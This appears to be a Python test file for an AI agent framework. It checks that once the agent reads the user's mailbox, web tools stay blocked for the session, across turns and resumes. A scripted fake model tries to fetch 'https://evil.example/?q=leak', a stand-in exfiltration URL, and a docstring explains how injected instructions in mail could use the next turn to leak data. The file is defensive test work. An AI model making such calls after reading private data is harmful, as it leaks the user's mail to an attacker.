"""The mailbox interlock, driven through the real turn loop.

Its own file rather than an appendix to `test_agent_loop.py`: this is one mechanism with one
argument to make — reading the user's mail closes every route off the box, and keeps it
closed on the next message — and the argument is easier to follow in one place.
"""

from __future__ import annotations

from agentd.agent.loop import AgentLoop, Session
from agentd.llm.fake import FakeProvider
from agentd.policy.approvals import AutoApprover
from agentd.policy.engine import engine_from_config
from agentd.tools.registry import Registry


async def _run(loop: AgentLoop, session: Session, text: str, **kwargs) -> list:
    return [event async for event in loop.run_turn(session, text, **kwargs)]

def _mail_registry():
    """A registry holding one private tool and the two web tools it closes the door on."""
    from agentd.tools import builtin_web
    from agentd.tools.base import Tool, ToolResult, obj

    async def handler(args, ctx):
        return ToolResult(content="From: prof@nyu.edu\n\nYou may submit on Monday.")

    reads_mail = Tool(
        name="reads_mail", description="reads the user's mailbox", parameters=obj(),
        handler=handler, effect_class="read", risk="read", tags=("mail",),
        trust_output=False, private_output=True,
    )
    reg = Registry()
    reg.add(reads_mail, *builtin_web.TOOLS)
    return reg


async def test_reading_mail_closes_the_door_for_the_rest_of_the_turn(cfg, journaled):
    """The whole point, proven through the real loop rather than the policy engine alone:
    the model reads mail, then tries to look something up, and the second call is refused."""
    provider = FakeProvider(turns=[
        [("reads_mail", {})],
        [("web_fetch", {"url": "https://evil.example/?q=leak"})],
        "I cannot reach the web after reading your mail.",
    ])
    loop = AgentLoop(
        cfg=cfg, registry=_mail_registry(), engine=engine_from_config(cfg),
        approver=AutoApprover(True), provider=provider,
    )
    session = await Session.create("test")
    await _run(loop, session, "what did my professor say?", autonomy="act")

    calls = journaled("tool_finished", "tool_failed")
    assert calls[0].type == "tool_finished" and calls[0].payload["name"] == "reads_mail"
    assert calls[1].type == "tool_failed" and calls[1].payload["name"] == "web_fetch"
    assert calls[1].payload["denied"] is True
    assert session.private is True


async def test_two_web_fetches_in_a_row_are_still_fine(cfg, journaled):
    """The control. Ordinary research raises `tainted` on the first fetch; if the interlock
    keyed on that instead of on `private`, page 2 would be impossible."""
    # Loopback URLs so this never touches the network: check_url refuses them inside the
    # handler, which is after the policy decision this test is about. A refusal is `ok=False`;
    # a policy denial is `denied=True`, and only the second one would mean the interlock
    # had fired.
    provider = FakeProvider(turns=[
        [("web_fetch", {"url": "http://127.0.0.1/1"})],
        [("web_fetch", {"url": "http://127.0.0.1/2"})],
        "Both pages read.",
    ])
    loop = AgentLoop(
        cfg=cfg, registry=_mail_registry(), engine=engine_from_config(cfg),
        approver=AutoApprover(True), provider=provider,
    )
    session = await Session.create("test")
    await _run(loop, session, "compare these pages", autonomy="act")

    calls = journaled("tool_finished", "tool_failed")
    assert [e.payload["name"] for e in calls] == ["web_fetch", "web_fetch"]
    assert not any(e.payload.get("denied") for e in calls)
    assert session.tainted is True and session.private is False


async def test_the_flag_outlives_the_turn_and_a_resume(cfg):
    """Session-scoped, and recoverable: `agent chat --resume` must not hand back a session
    whose interlock had been earned and then forgotten."""
    provider = FakeProvider(turns=[[("reads_mail", {})], "Read it."])
    loop = AgentLoop(
        cfg=cfg, registry=_mail_registry(), engine=engine_from_config(cfg),
        approver=AutoApprover(True), provider=provider,
    )
    session = await Session.create("test")
    await _run(loop, session, "read my mail", autonomy="act")
    assert session.private is True

    resumed = await Session.resume(session.id)
    assert resumed.private is True


async def test_an_ordinary_session_resumes_without_the_interlock(cfg):
    session = await Session.create("test")
    assert (await Session.resume(session.id)).private is False


async def test_the_door_stays_shut_on_the_next_message_too(cfg, journaled):
    """The regression for a bug a single-turn test cannot see.

    `run_turn` builds a fresh ToolContext per turn. Seeding `tainted` from the session but
    not `private` left the interlock working inside the turn that read the mail and gone by
    the next message — which is precisely the turn an injected instruction would use, since
    the model has to come back to the user before it can be asked to do anything with what
    it read. Caught by a live two-turn run, not by the suite; hence this test.
    """
    loop = AgentLoop(
        cfg=cfg, registry=_mail_registry(), engine=engine_from_config(cfg),
        approver=AutoApprover(True),
        provider=FakeProvider(turns=[[("reads_mail", {})], "Read it."]),
    )
    session = await Session.create("test")
    await _run(loop, session, "read my mail", autonomy="act")
    assert session.private is True

    loop.provider = FakeProvider(turns=[
        [("web_fetch", {"url": "http://127.0.0.1/leak"})],
        "I cannot reach the web after reading your mail.",
    ])
    await _run(loop, session, "now look something up", autonomy="act")
    fetches = [e for e in journaled("tool_failed") if e.payload["name"] == "web_fetch"]
    assert fetches and fetches[0].payload["denied"], "a new turn must not reopen the door"
